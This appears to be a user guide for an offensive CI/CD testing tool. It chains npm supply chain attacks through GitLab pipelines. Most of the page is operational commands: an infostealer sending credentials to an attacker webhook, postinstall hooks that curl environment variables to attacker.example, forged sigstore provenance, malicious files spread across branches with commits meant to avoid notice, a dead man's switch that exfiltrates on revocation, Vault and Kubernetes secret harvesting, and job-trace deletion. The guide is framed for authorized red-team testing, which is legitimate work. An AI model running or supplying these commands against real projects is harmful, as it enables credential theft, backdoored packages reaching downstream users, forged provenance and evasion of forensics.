---
title: Advanced Supply Chain Attacks
description: Multi-stage npm supply chain attacks with sigstore provenance, branch mutation, and dead man's switch persistence
---

This guide demonstrates a cohesive multi-stage supply chain attack workflow targeting npm ecosystems through GitLab CI/CD. Each step escalates from credential discovery through package tampering to persistent access with anti-forensics.

> Warning: These techniques are for authorized security testing only. Obtain written permission before testing.

## Overview

Modern CI/CD pipelines often have direct publish access to package registries (npm, PyPI, Maven). A compromised pipeline can:

1. Discover registry credentials stored on runners
2. Publish backdoored packages with legitimate-looking provenance
3. Spread malicious content across all branches to survive cleanup
4. Install dead man's switches for persistent re-entry

This guide chains GoGatoZ's new attack modules into a realistic engagement scenario targeting a GitLab project that publishes npm packages.

## 1. npm Token Discovery (Infostealer)

Start by deploying the expanded `infostealer` payload to sweep the runner's filesystem for credentials. The infostealer covers 40+ common credential paths including npm tokens, AI tool keys, Kubernetes configs, Docker registry auth, and GitHub CLI tokens.

```bash
# Preview the infostealer payload
gogatoz attack --payload-only --payload infostealer | jq .

# Deploy to a target project's runner
gogatoz attack --commit-ci --target group/npm-project \
  --payload infostealer --tags shell \
  --webhook https://attacker.example/creds \
  --branch gogatoz-recon --deconflict suffix
```

The infostealer performs a recursive `.env` file sweep across the build directory, extracts `gh auth token` output, and collects credentials from `~/.npmrc`, `~/.docker/config.json`, `~/.kube/config`, and service account tokens at `/var/run/secrets/`.

Key paths swept for npm-specific credentials:
- `~/.npmrc` (auth tokens, registry URLs)
- Project-level `.npmrc` files
- `NPM_TOKEN` / `NODE_AUTH_TOKEN` environment variables
- GitLab CI job tokens with registry scope

## 2. npm Package Tampering

With registry credentials in hand, use `--npm-tamper` to publish a backdoored version of an internal package. The payload modifies the package's `postinstall` hook to execute arbitrary commands on every `npm install`.

```bash
gogatoz attack --npm-tamper --target group/npm-project \
  --npm-package @company/shared-utils \
  --npm-inject-script 'curl -sS -d "$(printenv|base64 -w0)" https://attacker.example/cb' \
  --branch gogatoz-attack --deconflict suffix
```

This creates a CI job that:
1. Checks out the package source
2. Injects the payload into the `postinstall` hook in `package.json`
3. Bumps the patch version
4. Publishes to the configured npm registry

Every downstream project that runs `npm install` or `npm ci` with the tampered package will execute the injected script.

### Targeting a custom registry

Use `--npm-registry` to target a specific registry (e.g., a project-level GitLab npm registry):

```bash
gogatoz attack --npm-tamper --target group/npm-project \
  --npm-package @company/auth-sdk \
  --npm-registry https://gitlab.example.com/api/v4/projects/42/packages/npm/ \
  --npm-inject-script 'node -e "require(\"child_process\").execSync(\"env > /tmp/out\")"'
```

## 3. Sigstore Provenance Generation

Tampered packages are suspicious if they lack provenance attestations that legitimate builds produce. Use `--sigstore` to generate a cosign-compatible provenance attestation that makes the tampered package appear legitimately built.

```bash
gogatoz attack --sigstore --target group/npm-project \
  --sigstore-package ghcr.io/company/shared-utils \
  --sigstore-version 2.1.4 \
  --tags shell --branch gogatoz-attack --deconflict suffix
```

The generated attestation mimics the SLSA provenance format, including builder identity, source repository, and build invocation metadata from the CI environment. This defeats manual verification that only checks whether a provenance file exists.

## 4. Branch Mutator

To survive a targeted branch deletion, use `--branch-mutator` to replicate a malicious file across all (or a filtered set of) branches in the project. This ensures the payload persists even if the primary attack branch is discovered and removed.

```bash
gogatoz attack --branch-mutator --target group/npm-project \
  --mutator-file scripts/postinstall.sh \
  --mutator-content '#!/bin/sh\ncurl -sS -d "$(printenv|base64 -w0)" https://attacker.example/cb' \
  --mutator-max-branches 20
```

Key considerations:
- `--mutator-max-branches` limits blast radius during testing (set to 0 for all branches)
- Choose a file path that blends with the project (e.g., `scripts/`, `.github/`, config files)
- The mutator creates commits with innocuous messages to reduce audit log visibility

## 5. Dead Man's Switch

Install a dead man's switch that triggers a handler payload if the attacker's access is revoked. The switch periodically pings a monitor URL; if the URL stops responding (because the attacker's infrastructure is taken down or tokens are rotated), the handler fires.

```bash
gogatoz attack --dead-mans-switch --target group/npm-project \
  --dms-monitor-url https://attacker.example/heartbeat \
  --dms-interval 30m --dms-ttl 12h \
  --dms-handler 'curl -sd "$(printenv)" https://backup.example/exfil' \
  --dms-platform scheduled-pipeline
```

Platform options:
- `scheduled-pipeline` (default): Creates a GitLab scheduled pipeline that runs at the specified interval. Blends with existing scheduled CI jobs.
- `external-cron`: Generates a cron job payload for execution on the runner filesystem (requires runner persistence).

The `--dms-ttl` controls how long the switch waits after a missed heartbeat before triggering. Set this longer than your expected check-in interval to avoid false triggers.

## 6. Vault and K8s Credential Harvesting

Once inside the CI environment, expand access laterally by harvesting credentials from HashiCorp Vault and Kubernetes.

### Vault enumeration

CI pipelines often authenticate to Vault using JWT/OIDC tokens issued by GitLab. Use `--vault-enum` to enumerate all secrets reachable from the CI job's Vault identity:

```bash
gogatoz attack --vault-enum --target group/npm-project \
  --vault-addr https://vault.internal:8200 \
  --vault-auth-method jwt \
  --tags shell
```

This discovers secret engines, lists accessible paths, and attempts to read key-value pairs. Results are streamed to the configured webhook.

### Kubernetes secret sweep

If runners execute inside Kubernetes (or have access to a kubeconfig), sweep secrets from accessible namespaces:

```bash
gogatoz attack --k8s-secrets --target group/npm-project \
  --k8s-namespaces default,production,kube-system \
  --tags kubernetes \
  --webhook https://attacker.example/k8s
```

The sweep reads the runner's service account token (or mounted kubeconfig) and attempts `kubectl get secrets` across the specified namespaces. Discovered secrets often contain database credentials, API keys, and additional service account tokens.

## 7. Anti-Forensics

Clean up all attack artifacts in reverse order:

```bash
# Remove the dead man's switch scheduled pipeline
gogatoz attack --target group/npm-project --cleanup \
  --cleanup-pipeline <DMS_PIPELINE_ID>

# Delete attack branches
gogatoz attack --target group/npm-project --cleanup \
  --cleanup-branch gogatoz-attack

# Erase job traces from all attack-related branches
gogatoz attack --target group/npm-project --cleanup --cleanup-jobs \
  --cleanup-jobs-ref gogatoz-recon --cleanup-jobs-max 5 \
  --cleanup-jobs-delete

gogatoz attack --target group/npm-project --cleanup --cleanup-jobs \
  --cleanup-jobs-ref gogatoz-attack --cleanup-jobs-max 5 \
  --cleanup-jobs-delete
```

Note that branch mutator commits across many branches are harder to clean up. Document which branches were touched and coordinate with the target organization for remediation.

## Putting It Together

A typical advanced supply chain engagement follows this sequence:

1. **Recon** with `infostealer` payload to discover npm tokens, kubeconfigs, and Vault access
2. **Tamper** npm packages via `--npm-tamper` with injected postinstall hooks
3. **Legitimize** the tampered package with `--sigstore` provenance forgery
4. **Spread** via `--branch-mutator` to survive targeted branch cleanup
5. **Persist** with `--dead-mans-switch` for re-entry if access is revoked
6. **Expand** laterally with `--vault-enum` and `--k8s-secrets`
7. **Clean up** branches, job traces, and pipelines

Document each step with timestamps and evidence. Use `--output jsonl` during enumeration to capture structured findings for the final report.

## See Also

- [Supply Chain Attacks](/user-guide/use-cases/supply-chain/) for foundational supply chain techniques
- [Persistence Techniques](/user-guide/use-cases/persistence/) for deploy key and member addition persistence
- [Post-Compromise Enumeration](/user-guide/use-cases/post-compromise/) for initial access workflows
- [Attack Command Reference](/user-guide/command-reference/attack/) for all flags and options
